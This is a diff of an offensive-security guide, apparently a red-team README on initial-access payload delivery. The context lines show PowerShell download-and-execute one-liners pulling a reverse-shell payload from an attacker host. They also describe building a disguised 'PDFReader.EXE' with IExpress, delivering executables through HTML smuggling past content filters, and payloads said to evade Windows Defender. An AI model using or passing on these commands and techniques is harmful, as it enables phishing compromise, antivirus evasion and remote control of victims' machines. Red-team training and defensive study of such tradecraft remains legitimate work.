@@ -77,14 +77,13 @@ ps> iex (new-object net.webclient).downloadstring('http://10.10.10.10:8443/tools
 ```
 
 # Triggers
+# Embbeded payload to trigger a rev shell or any payload .exe. with LOLBAS.
 The trigger is the file that the user will interact with after extracting the container.  You typically want this to be as 'pain-free' as possible, like a double-click.
 In this stage the attacker already has a evil payload working or at least a rev shell working.
 
-## Embbeded payload to trigger a rev shell or any payload .exe. with LOLBAS.
+## IEXPRESS (LOLBAS)
 
-### IEXPRESS (LOLBAS)
-
-#### [00] INTRODUCTION
+### [00] INTRODUCTION
 IExpress vulnerability described in 1.3.6.1.4.1.25623.1.0.813808. It seems the issue with IExpress is that it can create packages which can be exploited by a vulnerability in some unpacker in the wild, but IExpress in itself is not vulnerable. The problem, as I understand it, is as follows:
 > - IExpress creates a self-extracting program which allows files to be extracted to locations outside of the current working directory, and includes a set of instructions for executing the files once they’re extracted.
 > - A malicious .dll is placed in the same folder as the self-extracting archive.
@@ -120,7 +119,7 @@ CompressionType=QUANTUM
 ...in that way, IExpress is able to create a package that can be exploited on some far-away computer, but it does not constitute a vulnerability on the computer being scanned because it itself does not extract the package. A design flaw, definitely, but not actually something that makes the computer vulnerable.
 
 
-#### [01] Create a EXE file, CMD & POWERSHELL
+### [01] Create a EXE file, CMD & POWERSHELL
 
 The template [PDFReader.SED](./tools/iexpress/PDFReader.SED) it already modify to hide the process of the commands lines.
 Modify you IP address and TCP port where your evil payload is hosted.
@@ -146,7 +145,7 @@ Ps C:\Users\win\Downloads> iexpress.exe /n /q PDFReader.SED
 Ps C:\Users\win\Downloads> .\PDFReader.EXE
 ```
 
-#### [10] DELIVERY MALICIOUS EXE IN HTML SMUGGLING
+### [10] DELIVERY MALICIOUS EXE IN HTML SMUGGLING
 HTML smuggling is a means of leveraging modern HTML5 and JavaScript features to sneak files past traditional content filters.  In old-skool phishing emails, you may see something like a button with a simple HREF.  The file itself will sit somewhere in the web root, maybe (/var/www/html/report.zip).  Then when clicked, the user's browser will perform another HTTP GET request to fetch the resource.  As it's being downloaded, scanners can see the file's content in the HTTP response.
 
 HTML smuggling works by encoding the file in the HTML content itself and using JavaScript to decode and download it to the victim's machine.  This is a simple template based on work by Stan Hegt.
@@ -183,7 +182,7 @@ Containers provide a means of bundling your dependencies (trigger, payload, and 
 Ref[PackMyPayload]: https://github.com/mgeeky/PackMyPayload
 
 
-#### [111] The following payloads was tested successfully against Windows Defender.
+### [111] The following payloads was tested successfully against Windows Defender.
 
 [1] [Reflective Payload](#reflectivedll): cObO.dll, bOlO.exe (windows/x64/shell_reverse_tcp)
 Triggers
@@ -191,11 +190,12 @@ Triggers
 ps> powershell iex(new-object System.Net.WebClient).DownloadString("http://ATTACKERIP:TCPORT/bOlO.exe")
 ps> powershell iwr  http://ATTACKERIP:TCPORT/bOlO.exe | iex
 ```
+
 [2] Obfuscate Basic payload: Change IPADDRESS and TCPPORT
----
+
 **Note:**
-It can be hosted as txt on a web server or as TXT record in a DNS server
----
+It can be hosted as txt on a web server or as TXT record in a DNS server\
+
 
 > - **Web Trigger**
 >
